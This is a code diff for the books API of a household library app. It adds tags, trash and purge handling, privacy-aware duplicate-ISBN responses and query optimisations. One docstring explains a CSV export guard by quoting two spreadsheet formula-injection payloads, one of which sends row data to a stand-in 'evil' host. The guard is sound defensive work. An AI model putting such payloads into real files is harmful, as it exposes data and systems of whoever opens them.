@@ -3,10 +3,9 @@ import io
 import re
 from collections.abc import Callable
 from datetime import UTC, date, datetime
-from typing import Annotated, Any
+from typing import Annotated, Any, Final
 
-import httpx
-from fastapi import APIRouter, File, HTTPException, Query, UploadFile, status
+from fastapi import APIRouter, Depends, File, HTTPException, Query, UploadFile, status
 from fastapi.responses import StreamingResponse
 from sqlalchemy import func, nullslast, or_
 from sqlalchemy.orm import Session, joinedload, selectinload
@@ -14,33 +13,54 @@ from sqlalchemy.sql.elements import UnaryExpression
 
 import google_books
 import isbn as isbn_utils
+import metadata
 import settings_store
+from auth import require_admin
 from config import COVERS_DIR
 from dependencies import (
     BookForOwner,
     BookForRead,
     BookForWrite,
+    BookInTrash,
     CurrentUser,
     DbSession,
     Paging,
 )
-from enums import BookSort, BulkAction, ExportFormat, OwnershipStatus, ReadStatus, SettingKey
-from models import Book, Loan, Note, Tag, User, UserBook, visible_to
+from enums import (
+    BookFormat,
+    BookSort,
+    BulkAction,
+    ExportFormat,
+    Locale,
+    OwnershipStatus,
+    ReadStatus,
+    SettingKey,
+    TagCategory,
+)
+from models import (
+    Book,
+    Loan,
+    Note,
+    Tag,
+    User,
+    UserBook,
+    book_tags,
+    in_trash_for,
+    visible_to,
+)
+from ratelimit import metadata_limiter
 from schemas import (
     BookCreate,
     BookDetailsUpdate,
     BookEnrichmentOut,
     BookLookup,
+    BookMatch,
     BookOut,
     BookRatingUpdate,
     BookStatusUpdate,
-    BulkOwnershipResult,
-    BulkOwnershipUpdate,
     BulkRequest,
     BulkResult,
     DuplicateGroup,
-    GoogleBooksMatch,
-    LoanOut,
     LocationOut,
     MergeRequest,
     NoteCreate,
@@ -48,205 +68,120 @@ from schemas import (
     OwnershipUpdate,
     Page,
     PrivacyUpdate,
+    PurgeResult,
     SeriesOut,
+    TagCreate,
     TagOut,
-    UserOut,
 )
-from uploads import read_image_upload
+from serialisation import book_to_out, books_to_out, match_subjects_to_tags
+from uploads import read_image_upload, replace_image
 
 router = APIRouter(prefix="/api/books", tags=["books"])
-
-# How long to wait on Open Library / Google Books before giving up. These are
-# third-party services on the request path, so the timeout is what stops a slow
-# one from holding a worker open.
-_LOOKUP_TIMEOUT_SECONDS = 10
-
-
-# ── Metadata sources ──────────────────────────────────────────────────────────
-
-
-async def _fetch_open_library(isbn: str) -> dict[str, Any] | None:
-    url = f"https://openlibrary.org/isbn/{isbn}.json"
-    async with httpx.AsyncClient(timeout=_LOOKUP_TIMEOUT_SECONDS, follow_redirects=True) as client:
-        response = await client.get(url)
-        if response.status_code != 200:
-            return None
-        data = response.json()
-
-    # Author names live at /authors/{key}.json. Fetch the first one.
-    author: str | None = None
-    authors_list = data.get("authors", [])
-    if authors_list:
-        author_key = authors_list[0].get("key", "")
-        async with httpx.AsyncClient(
-            timeout=_LOOKUP_TIMEOUT_SECONDS, follow_redirects=True
-        ) as client:
-            author_response = await client.get(f"https://openlibrary.org{author_key}.json")
-            if author_response.status_code == 200:
-                author = author_response.json().get("name")
-
-    publishers = data.get("publishers", [])
-    publish_dates = data.get("publish_date", "")
-    year_match = re.search(r"\d{4}", publish_dates) if publish_dates else None
-
-    # description is either a plain string or {"value": ...}, depending on age.
-    description_raw = data.get("description", "")
-    description = (
-        description_raw.get("value", "") if isinstance(description_raw, dict) else description_raw
-    )
-
-    subjects: list[str] = []
-    for key in ("subjects", "subject_places", "subject_times", "subject_people"):
-        for entry in data.get(key, []):
-            if isinstance(entry, str):
-                subjects.append(entry)
-            elif isinstance(entry, dict) and "name" in entry:
-                subjects.append(entry["name"])
-
-    return {
-        "isbn": isbn,
-        "title": data.get("title", ""),
-        "subtitle": data.get("subtitle"),
-        "author": author,
-        "publisher": publishers[0] if publishers else None,
-        "year": int(year_match.group()) if year_match else None,
-        "description": description or None,
-        "cover_url": f"https://covers.openlibrary.org/b/isbn/{isbn}-L.jpg",
-        "subjects": subjects,
-    }
-
-
-async def _fetch_google_books(isbn: str) -> dict[str, Any] | None:
-    url = f"https://www.googleapis.com/books/v1/volumes?q=isbn:{isbn}"
-    async with httpx.AsyncClient(timeout=_LOOKUP_TIMEOUT_SECONDS, follow_redirects=True) as client:
-        response = await client.get(url)
-        if response.status_code != 200:
-            return None
-        data = response.json()
-
-    items = data.get("items", [])
-    if not items:
-        return None
-
-    info = items[0].get("volumeInfo", {})
-    isbn13 = next(
-        (i["identifier"] for i in info.get("industryIdentifiers", []) if i["type"] == "ISBN_13"),
-        isbn,
-    )
-    published = info.get("publishedDate", "")
-    year_match = re.search(r"\d{4}", published) if published else None
-
-    return {
-        "isbn": isbn13,
-        "title": info.get("title", ""),
-        "subtitle": info.get("subtitle"),
-        "author": ", ".join(info.get("authors", [])) or None,
-        "publisher": info.get("publisher"),
-        "year": int(year_match.group()) if year_match else None,
-        "description": info.get("description"),
-        "cover_url": info.get("imageLinks", {}).get("thumbnail"),
-        "subjects": info.get("categories", []),
-    }
-
-
-def _match_subjects_to_tags(subjects: list[str], tags: list[Tag]) -> list[int]:
-    """Case-insensitive substring match of source subjects against our tags."""
-    if not subjects:
-        return []
-    subjects_blob = " | ".join(subject.lower() for subject in subjects)
-    matched: list[int] = []
-    for tag in tags:
-        # Strip parenthetical suffixes: "Young Adult (13-18)" becomes "young adult".
-        tag_core = re.sub(r"\s*\([^)]+\)", "", tag.name).strip().lower()
-        if tag_core and tag_core in subjects_blob:
-            matched.append(tag.id)
-    return matched
-
-
-# ── Serialisation ─────────────────────────────────────────────────────────────
-
-
-def _loan_summary(loan: Loan) -> LoanOut:
-    """A loan as it appears *inside* a book payload.
-
-    `book` is left None deliberately: the caller is already holding the book
-    this loan belongs to, and populating it would both bloat the response and
-    trigger a lazy load per book.
-    """
-    return LoanOut(
-        id=loan.id,
-        book_id=loan.book_id,
-        loaned_to_user_id=loan.loaned_to_user_id,
-        loaned_by_user_id=loan.loaned_by_user_id,
-        loaned_at=loan.loaned_at,
-        returned_at=loan.returned_at,
-        book=None,
-        loaned_to=UserOut.model_validate(loan.loaned_to) if loan.loaned_to else None,
-        loaned_by=UserOut.model_validate(loan.loaned_by) if loan.loaned_by else None,
-    )
-
-
-def _books_to_out(books: list[Book], current_user: User, db: Session) -> list[BookOut]:
-    """Serialise a page of books, adding the two per-request fields.
-
-    `active_loan` and `my_status` are not columns, and the obvious
-    implementation queries for each of them per book, which is what made
-    listing 25 books cost 53 SELECTs. Both are fetched here in one query each,
-    so a page costs a constant three regardless of its size.
-    """
-    if not books:
-        return []
-
-    book_ids = [book.id for book in books]
-
-    active_loans = {
-        loan.book_id: loan
-        for loan in db.query(Loan)
-        .options(joinedload(Loan.loaned_to), joinedload(Loan.loaned_by))
-        .filter(Loan.book_id.in_(book_ids), Loan.returned_at.is_(None))
-        .all()
-    }
-
-    # One query for the whole page, not one per book. The row carries the
-    # status, the rating and both dates, so adding those three fields cost no
-    # extra statements: the fetch was already here.
-    user_books = {
-        user_book.book_id: user_book
-        for user_book in db.query(UserBook)
-        .filter(UserBook.user_id == current_user.id, UserBook.book_id.in_(book_ids))
-        .all()
-    }
-
-    results: list[BookOut] = []
-    for book in books:
-        out = BookOut.model_validate(book)
-        loan = active_loans.get(book.id)
-        out.active_loan = _loan_summary(loan) if loan else None
-
-        user_book = user_books.get(book.id)
-        # No row means unread: a user_books row only appears once a status is set.
-        # The status is coerced back to the enum explicitly, because the column
-        # is a plain VARCHAR and assigning a str onto an enum-typed Pydantic
-        # field bypasses validation and serialises with a warning. (Assignment
-        # skips validation; model_validate would coerce.)
-        out.my_status = ReadStatus(user_book.status) if user_book else ReadStatus.UNREAD
-        out.my_rating = user_book.rating if user_book else None
-        out.my_started_at = user_book.started_at if user_book else None
-        out.my_finished_at = user_book.finished_at if user_book else None
-        results.append(out)
-    return results
-
-
-def _book_to_out(book: Book, current_user: User, db: Session) -> BookOut:
-    return _books_to_out([book], current_user, db)[0]
 
 
 # ── Tags and lookup ───────────────────────────────────────────────────────────
 
 
 @router.get("/tags", response_model=list[TagOut])
-def list_tags(db: DbSession, current_user: CurrentUser) -> list[Tag]:
-    return db.query(Tag).order_by(Tag.category, Tag.name).all()
+def list_tags(db: DbSession, current_user: CurrentUser) -> list[TagOut]:
+    """The curated vocabulary plus whatever the household has invented.
+
+    The **client** decides the order the groups appear in (`TAG_CATEGORY_ORDER`
+    in the frontend), because that is a presentation decision and it needs the
+    same order in three places. This orders by name within the group, which is
+    the only part the server can usefully settle.
+
+    `book_count` is one grouped query for the whole list rather than one per
+    tag: this is fetched on nearly every page, so an N+1 here is an N+1
+    everywhere.
+    """
+    # Joined to Book and filtered, like every other query that counts books.
+    # Without it the count included other members' **private** books and
+    # trashed ones, and this endpoint is fetched on nearly every page, so a
+    # member could watch somebody else's private additions accrue in a number
+    # their own listing said was zero.
+    counts = dict(
+        db.query(book_tags.c.tag_id, func.count(book_tags.c.book_id))
+        .join(Book, Book.id == book_tags.c.book_id)
+        .filter(visible_to(current_user.id))
+        .group_by(book_tags.c.tag_id)
+        .all()
+    )
+    return [
+        TagOut(
+            id=tag.id,
+            name=tag.name,
+            category=TagCategory(tag.category),
+            is_predefined=tag.is_predefined,
+            book_count=counts.get(tag.id, 0),
+        )
+        for tag in db.query(Tag).order_by(Tag.category, Tag.name).all()
+    ]
+
+
+@router.post("/tags", response_model=TagOut, status_code=status.HTTP_201_CREATED)
+def create_tag(payload: TagCreate, db: DbSession, current_user: CurrentUser) -> Tag:
+    """Invent a tag.
+
+    Any member, not just an admin. Public books are a shared shelf that anyone
+    may curate, and a vocabulary only an admin can extend is a vocabulary
+    nobody uses.
+
+    Matched case-insensitively against what already exists, so "Cookbooks" and
+    "cookbooks" cannot both appear. A collision returns the existing tag rather
+    than a 409: somebody typing a name that is already there wants that tag,
+    and an error would send them to find it by hand.
+    """
+    existing = (
+        db.query(Tag).filter(func.lower(Tag.name) == payload.name.lower()).first()
+    )
+    if existing is not None:
+        return existing
+
+    tag = Tag(name=payload.name, category=TagCategory.CUSTOM, is_predefined=False)
+    db.add(tag)
+    db.commit()
+    db.refresh(tag)
+    return tag
+
+
+@router.delete("/tags/{tag_id}", status_code=status.HTTP_204_NO_CONTENT)
+def delete_tag(
+    tag_id: int,
+    db: DbSession,
+    current_user: Annotated[User, Depends(require_admin)],
+) -> None:
+    """Remove a tag the household invented, and take it off every book.
+
+    **Admin only, and deliberately asymmetric with creating one.** Creating a
+    tag is additive and reversible by deleting it, so it is open to everyone.
+    Deleting one is neither: it strips the tag from every book in the house at
+    once, there is no undo for it as there is for a deleted book, and `Tag`
+    records nobody as its author. One member should not be able to quietly
+    unpick the shared vocabulary.
+
+    A seeded tag is refused rather than deleted. `seed_tags()` runs at every
+    boot and would put it straight back, so the delete would appear to work
+    and then quietly undo itself at the next restart.
+
+    Declared before `/{book_id}`: two segments, but the ordering is what keeps
+    that true if either path is later reshaped.
+    """
+    tag = db.get(Tag, tag_id)
+    if tag is None:
+        raise HTTPException(status_code=404, detail="Tag not found")
+    if tag.is_predefined:
+        raise HTTPException(
+            status_code=400,
+            detail="That tag is part of the built-in list and cannot be removed.",
+        )
+
+    # The association rows go with it. `book_tags` has ON DELETE CASCADE, but
+    # SQLite only enforces foreign keys when the pragma is on, so the rows are
+    # cleared here rather than trusted to the database.
+    db.execute(book_tags.delete().where(book_tags.c.tag_id == tag_id))
+    db.delete(tag)
+    db.commit()
 
 
 @router.get("/lookup", response_model=BookLookup)
@@ -257,6 +192,7 @@ async def lookup_isbn(
 ) -> BookLookup:
     # Validated before either upstream is called: a misread barcode would
     # otherwise cost two network round trips to learn nothing.
+    metadata_limiter.check(current_user.username)
     canonical = isbn_utils.parse(isbn)
     if canonical is None:
         raise HTTPException(
@@ -264,49 +200,99 @@ async def lookup_isbn(
             detail="Not a valid ISBN. Check the digits and try again.",
         )
 
-    data = await _fetch_open_library(canonical)
-    if not data:
-        data = await _fetch_google_books(canonical)
-    if not data:
-        raise HTTPException(status_code=404, detail="Book not found for this ISBN")
+    # The key is passed even though Google is the last source tried, because
+    # the whole reason the fallback used to fail was a request that omitted it.
+    result = await metadata.lookup(canonical, settings_store.google_books_api_key(db))
+    if not result.found:
+        raise HTTPException(**_lookup_failure(result))
 
+    assert result.data is not None
+    data = dict(result.data)
     subjects = data.pop("subjects", [])
     all_tags = db.query(Tag).all()
-    return BookLookup(**data, suggested_tag_ids=_match_subjects_to_tags(subjects, all_tags))
+    return BookLookup(**data, suggested_tag_ids=match_subjects_to_tags(subjects, all_tags))
 
 
-@router.get("/google/search", response_model=list[GoogleBooksMatch])
-async def search_google_books(
+def _lookup_failure(result: metadata.Lookup) -> dict[str, Any]:
+    """Turn a failed lookup into the status and wording it deserves.
+
+    All three used to be "Book not found for this ISBN", which sends someone to
+    type a book in by hand when the honest answer is that a quota will reset in
+    a few minutes. 503 rather than 404 for the two transient cases, so the
+    client can offer "try again" instead of "add it manually".
+    """
+    if result.outcome is metadata.Outcome.RATE_LIMITED:
+        return {
+            "status_code": status.HTTP_503_SERVICE_UNAVAILABLE,
+            "detail": (
+                "The book catalogues are rate limiting us right now. Wait a minute "
+                "and scan again, or add the book by hand."
+            ),
+        }
+    if result.outcome is metadata.Outcome.UNAVAILABLE:
+        return {
+            "status_code": status.HTTP_503_SERVICE_UNAVAILABLE,
+            "detail": (
+                "Could not reach the book catalogues. Check the connection, or add "
+                "the book by hand."
+            ),
+        }
+    return {
+        "status_code": status.HTTP_404_NOT_FOUND,
+        "detail": "No catalogue has a record for this ISBN.",
+    }
+
+
+@router.get("/search", response_model=list[BookMatch])
+async def search_books(
     db: DbSession,
     current_user: CurrentUser,
     q: Annotated[str, Query(min_length=2, max_length=200, description="Title, author or both")],
     limit: Annotated[int, Query(ge=1, le=20)] = 10,
-) -> list[GoogleBooksMatch]:
+    lang: Annotated[
+        Locale | None,
+        Query(description="Prefer editions in this language when ranking"),
+    ] = None,
+) -> list[BookMatch]:
     """Free-text search, for adding a book nobody can scan.
 
     The barcode path covers a book that is physically to hand. This covers the
-    rest: a book with no barcode, a damaged one, or one being added from a
-    list rather than from the shelf. The caller picks a result and the client
-    prefills the form from it, so nothing is written until a person confirms.
+    rest: a book with no barcode, a damaged one, one printed before ISBNs
+    existed, or one being added from a list rather than from the shelf. The
+    caller picks a result and the client prefills the form from it, so nothing
+    is written until a person confirms.
 
-    Two segments (`/google/search`) rather than one, so it cannot be confused
-    with `/{book_id}` however the routes are later reordered.
+    **No API key is required.** This used to be Google Books only and was
+    hidden entirely from a household that had not configured one, which left
+    them with no way at all to add a book by title. Open Library answers
+    without a key; Google is merged in on top when one is set, for the blurb
+    and the categories its search index carries and Open Library's does not.
+
+    Two segments (`/google/search`) used to guard against this being confused
+    with `/{book_id}`; a single one is safe for the same reason `/export` is,
+    which is that it is declared first.
     """
-    api_key = _require_google_books(db)
+    api_key = ""
+    if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED):
+        # The resolved key, so an environment-supplied one counts. Absent is
+        # not an error here: it costs the Google half of the results, not the
+        # search.
+        api_key = settings_store.google_books_api_key(db)
 
-    try:
-        matches = await google_books.search(q, api_key, limit=limit)
-    except google_books.GoogleBooksError as error:
-        raise HTTPException(status_code=502, detail=str(error)) from error
+    metadata_limiter.check(current_user.username)
+    # The reader's own language, so a German household searching a German
+    # title gets the German printing first. It breaks ties only: an English
+    # title still returns the English book.
+    matches = await metadata.search(q, api_key, limit=limit, prefer_language=lang)
 
     all_tags = db.query(Tag).all()
-    results: list[GoogleBooksMatch] = []
+    results: list[BookMatch] = []
     for match in matches:
         subjects = google_books.split_categories(match.get("categories"))
         results.append(
-            GoogleBooksMatch(
+            BookMatch(
                 **match,
-                suggested_tag_ids=_match_subjects_to_tags(subjects, all_tags),
+                suggested_tag_ids=match_subjects_to_tags(subjects, all_tags),
             )
         )
     return results
@@ -354,21 +340,36 @@ def export_books(
             [
                 "Title", "Author", "ISBN", "Publisher", "Year",
                 "Description", "Tags", "My Status", "Date Added", "Added By",
+                "Format", "Condition", "Location", "Purchase Price",
+                "Purchase Currency", "Purchased On", "Purchased From",
             ]
         )
         for book in books:
+            # Every member-supplied cell goes through `_csv_safe`. The numeric
+            # and enum columns do not need it and are passed through it anyway,
+            # so adding a column cannot accidentally skip the guard.
             writer.writerow(
                 [
-                    book.title or "",
-                    book.author or "",
-                    book.isbn or "",
-                    book.publisher or "",
+                    _csv_safe(book.title),
+                    _csv_safe(book.author),
+                    _csv_safe(book.isbn),
+                    _csv_safe(book.publisher),
                     book.year if book.year is not None else "",
-                    book.description or "",
-                    "; ".join(tag.name for tag in book.tags),
+                    _csv_safe(book.description),
+                    _csv_safe("; ".join(tag.name for tag in book.tags)),
                     status_map.get(book.id, ReadStatus.UNREAD),
                     book.added_at.date().isoformat() if book.added_at else "",
-                    book.added_by.username if book.added_by else "",
+                    _csv_safe(book.added_by.username if book.added_by else ""),
+                    book.format or "",
+                    book.condition or "",
+                    _csv_safe(book.location),
+                    # Back to major units for the export. A spreadsheet column
+                    # of cents is not what anybody means by "what did this
+                    # cost", and an export is read by people, not by us.
+                    _price_column(book.purchase_price_minor),
+                    book.purchase_currency or "",
+                    book.purchased_at.isoformat() if book.purchased_at else "",
+                    _csv_safe(book.purchase_source),
                 ]
             )
         content = output.getvalue()
@@ -402,6 +403,39 @@ def export_books(
     )
 
 
+#: Characters that make a spreadsheet treat a cell as a formula rather than as
+#: text. Tab and carriage return are here because Excel strips them and then
+#: reads whatever follows, so a value beginning "\t=cmd..." executes too.
+_FORMULA_LEAD: Final = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value: object) -> str:
+    """Neutralise a cell that a spreadsheet would run as a formula.
+
+    Every text column of this export is member-supplied: titles, authors,
+    publishers, descriptions, shelf locations and **tag names**. Tags are
+    household-wide, so a tag put on a public book reaches every other member's
+    export. `=HYPERLINK("http://evil/?d="&A1,"ok")` in a title exfiltrates the
+    row when an admin opens the file, and `=cmd|'/c calc'!A1` is the older
+    trick. `csv.writer` quotes for CSV correctness and does nothing about this.
+
+    A leading apostrophe is the conventional fix: Excel and LibreOffice both
+    treat the cell as text and hide the character. It is applied only to values
+    that would otherwise be executed, so an ordinary title is untouched.
+    """
+    text = "" if value is None else str(value)
+    return f"'{text}" if text.startswith(_FORMULA_LEAD) else text
+
+
+def _price_column(minor: int | None) -> str:
+    """Cents back to a plain decimal string, for the export only.
+
+    Two decimal places always, so a column of prices lines up and a
+    spreadsheet reads them as numbers rather than as text.
+    """
+    return "" if minor is None else f"{minor / 100:.2f}"
+
+
 # ── Listing ───────────────────────────────────────────────────────────────────
 
 # Annotated explicitly: without it mypy widens the heterogeneous values to
@@ -433,6 +467,7 @@ def list_books(
     status_filter: Annotated[ReadStatus | None, Query(alias="status")] = None,
     tags: Annotated[str | None, Query(description="Comma-separated tag ids")] = None,
     ownership: Annotated[OwnershipStatus | None, Query()] = None,
+    format: Annotated[BookFormat | None, Query()] = None,
     series: Annotated[str | None, Query(max_length=255)] = None,
     location: Annotated[str | None, Query(max_length=120)] = None,
     unrated: Annotated[bool, Query(description="Only books you have not rated")] = False,
@@ -442,6 +477,9 @@ def list_books(
 
     if ownership is not None:
         query = query.filter(Book.ownership == ownership)
+
+    if format is not None:
+        query = query.filter(Book.format == format)
 
     if series is not None:
         query = query.filter(Book.series_name == series)
@@ -509,7 +547,7 @@ def list_books(
     )
 
     return Page[BookOut](
-        items=_books_to_out(books, current_user, db),
+        items=books_to_out(books, current_user, db),
         total=total,
         page=paging.page,
         page_size=paging.page_size,
@@ -523,15 +561,83 @@ def _create_book(payload: BookCreate, current_user: User, db: Session, conflict:
     # payload.isbn is already canonical ISBN-13 (see BookCreate's validator),
     # but rows written before canonicalisation may hold the ISBN-10, so both
     # spellings are checked or the same book gets added twice.
+    #
+    # This query deliberately does NOT apply `visible_to`: the ISBN is unique
+    # across the whole table, so a clash with somebody else's private book is
+    # still a clash. That also means it sees **trashed** rows, which is the
+    # trap soft deletion introduces and `_free_the_isbn` exists to resolve.
     if payload.isbn:
         forms = isbn_utils.equivalent_forms(payload.isbn)
-        if forms and db.query(Book).filter(Book.isbn.in_(forms)).first():
-            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail=conflict)
+        if forms:
+            # visible_to exempt: the ISBN is UNIQUE across the whole table,
+            # invisible rows included, so a filtered check would miss the row
+            # that is actually going to collide and turn a 409 into a 500.
+            holder = db.query(Book).filter(Book.isbn.in_(forms)).first()
+            if holder is not None and not _free_the_isbn(holder, current_user, db):
+                raise HTTPException(
+                    status_code=status.HTTP_409_CONFLICT,
+                    detail=_conflict_detail(conflict, holder, current_user),
+                )
     book = Book(**payload.model_dump(), added_by_user_id=current_user.id)
     db.add(book)
     db.commit()
     db.refresh(book)
-    return _book_to_out(book, current_user, db)
+    return book_to_out(book, current_user, db)
+
+
+def _conflict_detail(message: str, holder: Book, current_user: User) -> str | dict[str, object]:
+    """The 409 body for a book whose ISBN is already taken.
+
+    Re-scanning a book already on the shelf is not a rare mistake, it is what
+    happens on the second pass through a bookcase. Answering it with a bare
+    sentence leaves the reader holding the book with nothing to press: they
+    have to go and find it themselves to check it really is the same edition.
+    So the id travels with the message and the UI offers to open it.
+
+    **Only when the holder is visible to the caller.** The uniqueness check
+    deliberately sees every row, private ones included, so returning the id
+    unconditionally would turn a 409 into a way to confirm that a particular
+    member owns a particular book, which is exactly what `is_private` promises
+    it will not do. In that case the message goes back on its own, and it is
+    the same message, so the response does not disclose which case it was.
+    """
+    if holder.is_private and holder.added_by_user_id != current_user.id:
+        return message
+    return {"message": message, "book_id": holder.id}
+
+
+def _free_the_isbn(holder: Book, current_user: User, db: Session) -> bool:
+    """Clear a trashed row out of the way of a book being added again.
+
+    Without this, deleting a book and re-scanning it reports "already exists"
+    for a book the member cannot see anywhere, which is a worse bug than the
+    one soft deletion fixes. `implementation.md` names mis-scan, delete,
+    re-scan as the most common delete in this app, so it is also the common
+    path rather than a corner.
+
+    Purged rather than restored, so the outcome matches what deleting and
+    re-adding has always done here: a fresh record. Restoring instead would
+    silently hand back the record somebody had just rejected, which is exactly
+    what a person who deleted it because its metadata was wrong does not want.
+    Losing the undo window costs nothing: they are holding the book and adding
+    it right now.
+
+    **Only a row this member could have seen in their own trash.** Purging
+    somebody else's trashed private book because their ISBN happened to match
+    would destroy data they never offered up, and would confirm the book
+    existed. That case keeps the 409.
+    """
+    if holder.deleted_at is None:
+        return False
+    visible = not holder.is_private or holder.added_by_user_id == current_user.id
+    if not visible:
+        return False
+    _purge(holder, db)
+    # Flushed, not committed: `_create_book` owns the transaction and commits
+    # once. Without this the DELETE is still pending when the INSERT runs and
+    # the unique ISBN index rejects it, which is the whole thing this avoids.
+    db.flush()
+    return True
 
 
 @router.post("", response_model=BookOut, status_code=status.HTTP_201_CREATED)
@@ -566,8 +672,11 @@ def bulk_action(
     updated/unchanged/skipped. Six handlers would be six copies of the
     permission walk, and the fifth one added would be the one that forgot it.
 
-    `/bulk/ownership` predates this and is kept: it is the older, narrower
-    shape and something may already be calling it.
+    A separate `/bulk/ownership` used to sit beside this with the same body,
+    the same permission walk and an identical result shape. It was removed
+    rather than carried into the first tagged release: two endpoints for one
+    action is two places for the next change to have to land, and dropping one
+    after a release is a breaking change rather than a tidy-up.
     """
     requested = set(payload.book_ids)
     books = (
@@ -693,8 +802,13 @@ def _bulk_set_location(
 def _bulk_delete(
     db: Session, books: list[Book], value: str | int | None, current_user: User
 ) -> tuple[int, int]:
+    """Trash a selection. The same reversible delete as the single-book route.
+
+    Bulk is where an accident is most expensive: this is the verb that runs
+    against a few hundred selected rows at once.
+    """
     for book in books:
-        db.delete(book)
+        _trash(book, db)
     return len(books), 0
 
 
@@ -719,45 +833,6 @@ _BULK_HANDLERS: dict[
     BulkAction.SET_LOCATION: _bulk_set_location,
     BulkAction.DELETE: _bulk_delete,
 }
-
-
-@router.post("/bulk/ownership", response_model=BulkOwnershipResult)
-def bulk_set_ownership(
-    payload: BulkOwnershipUpdate,
-    db: DbSession,
-    current_user: CurrentUser,
-) -> BulkOwnershipResult:
-    """Mark a selection of books as owned, not owned, or unverified.
-
-    Declared before /{book_id} would match "bulk" as an id, which is the same
-    trap /export sits behind.
-
-    Only books the caller may modify are touched. A selection containing
-    someone else's private book reports it as skipped rather than failing the
-    whole request: the member cannot see that book to deselect it, so failing
-    would leave them stuck with no way to tell which entry was the problem.
-    """
-    requested = set(payload.book_ids)
-
-    books = db.query(Book).filter(Book.id.in_(requested), visible_to(current_user.id)).all()
-
-    updated = 0
-    unchanged = 0
-    for book in books:
-        if book.ownership == payload.ownership:
-            unchanged += 1
-            continue
-        book.ownership = payload.ownership
-        updated += 1
-
-    if updated:
-        db.commit()
-
-    return BulkOwnershipResult(
-        updated=updated,
-        unchanged=unchanged,
-        skipped=len(requested) - len(books),
-    )
 
 
 # ── Browsing by series and by shelf ───────────────────────────────────────────
@@ -837,16 +912,34 @@ def list_duplicates(db: DbSession, current_user: CurrentUser) -> list[DuplicateG
     SQLite can express, and the catalogue is small enough that scanning it is
     cheaper than maintaining a normalised column.
     """
-    books = db.query(Book).filter(visible_to(current_user.id)).all()
+    # Two nested N+1s used to live here, measured at 4002 statements and 5.5
+    # seconds over 2000 books, on an endpoint that is unpaginated and backs a
+    # UI page. `BookOut.tags` lazy-loaded once per book, and `books_to_out`
+    # was called once per group rather than once for the lot.
+    books = (
+        db.query(Book)
+        .options(joinedload(Book.added_by), selectinload(Book.tags))
+        .filter(visible_to(current_user.id))
+        .all()
+    )
 
     groups: dict[str, list[Book]] = {}
     for book in books:
         groups.setdefault(_duplicate_key(book), []).append(book)
 
+    duplicated = {key: members for key, members in groups.items() if len(members) > 1}
+    if not duplicated:
+        return []
+
+    # One serialisation pass for every duplicate, then partitioned back into
+    # groups. `books_to_out` costs a constant three statements whatever it is
+    # given, so calling it per group is what made it linear in groups.
+    flat = [book for members in duplicated.values() for book in members]
+    serialised = {out.id: out for out in books_to_out(flat, current_user, db)}
+
     return [
-        DuplicateGroup(key=key, books=_books_to_out(members, current_user, db))
-        for key, members in sorted(groups.items())
-        if len(members) > 1
+        DuplicateGroup(key=key, books=[serialised[book.id] for book in members])
+        for key, members in sorted(duplicated.items())
     ]
 
 
@@ -945,7 +1038,7 @@ def merge_books(
         db.delete(loser)
     db.commit()
     db.refresh(keeper)
-    return _book_to_out(keeper, current_user, db)
+    return book_to_out(keeper, current_user, db)
 
 
 _MERGEABLE_FIELDS = (
@@ -954,6 +1047,8 @@ _MERGEABLE_FIELDS = (
     "subtitle", "author", "publisher", "year", "description", "cover_url",
     "page_count", "language", "categories", "google_books_id",
     "series_name", "series_index", "location",
+    "format", "condition", "purchase_price_minor", "purchase_currency",
+    "purchased_at", "purchase_source",
 )
 
 
@@ -995,8 +1090,31 @@ def _repoint_relations(db: Session, keeper: Book, losers: list[Book]) -> None:
     # and the delete that follows would cascade straight through them.
     for note in db.query(Note).filter(Note.book_id.in_(loser_ids)).all():
         note.book_id = keeper.id
-    for loan in db.query(Loan).filter(Loan.book_id.in_(loser_ids)).all():
+
+    moved = db.query(Loan).filter(Loan.book_id.in_(loser_ids)).all()
+    for loan in moved:
         loan.book_id = keeper.id
+
+    # Merging two books that are both lent out used to give the survivor **two
+    # open loans**, which the data model says cannot happen: `returned_at IS
+    # NULL` is the single active loan. Every later `POST /api/loans` on that
+    # book then 409s forever, and the UI renders one `active_loan` so there is
+    # no way to see or close the other.
+    #
+    # The earliest one stays open, because it is the loan that has been out
+    # longest and is the one worth chasing. The rest are closed now: the books
+    # they described have just become one book, so they are not still out.
+    # Built from the objects in hand rather than by re-querying: the
+    # repointing above is not flushed yet, so a fresh query does not
+    # necessarily see the moved loans as belonging to the survivor.
+    on_keeper = db.query(Loan).filter(Loan.book_id == keeper.id).all()
+    open_loans = sorted(
+        {loan.id: loan for loan in [*on_keeper, *moved]}.values(),
+        key=lambda loan: (loan.loaned_at, loan.id),
+    )
+    still_open = [loan for loan in open_loans if loan.returned_at is None]
+    for loan in still_open[1:]:
+        loan.returned_at = datetime.now(UTC).replace(tzinfo=None)
 
     # Statuses cannot simply move: (user_id, book_id) is unique, so a member
     # holding a status on two of the merged rows would violate it. The
@@ -1013,12 +1131,110 @@ def _repoint_relations(db: Session, keeper: Book, losers: list[Book]) -> None:
             already_rated.add(user_book.user_id)
 
 
+# ── Trash ─────────────────────────────────────────────────────────────────────
+#
+# Deleting parks a row rather than dropping it. Three things follow from that,
+# and each is somewhere a naive soft delete goes wrong.
+
+
+def _trash(book: Book, db: Session) -> None:
+    """Stamp the deletion, and close any loan that was open on it.
+
+    The loan has to go with it. A trashed book leaves the loans list, which is
+    deliberate, but the loan row stayed open and `PUT /api/loans/{id}/return`
+    404s on a book nobody can see, so the borrower still had it and there was
+    no way left to record it coming back. Closing it is the honest end: the
+    book has left the catalogue, so the app is no longer tracking who has it.
+
+    **Does not commit.** The caller does, once. Committing here made a bulk
+    delete of 500 books 1001 statements and 2.08 seconds, because each commit
+    expires the session and forces the next book to be re-selected, and it made
+    the operation non-atomic: a crash halfway left half the selection deleted.
+    """
+    if book.deleted_at is not None:
+        return
+
+    now = datetime.now(UTC).replace(tzinfo=None)
+    book.deleted_at = now
+    for loan in db.query(Loan).filter(
+        Loan.book_id == book.id, Loan.returned_at.is_(None)
+    ):
+        loan.returned_at = now
+
+
+def _purge(book: Book, db: Session) -> None:
+    """Delete a trashed book for good, and its cover file with it.
+
+    The cover is the part a soft delete leaves behind. Files are named by book
+    id, so the next book to take that id inherits somebody else's cover, and
+    since ids are reused by SQLite after the highest row goes, that is not a
+    remote possibility.
+
+    **Does not commit**, for the same reason as `_trash`: emptying a trash of
+    500 books was 3801 statements and 3.6 seconds of re-selecting.
+    """
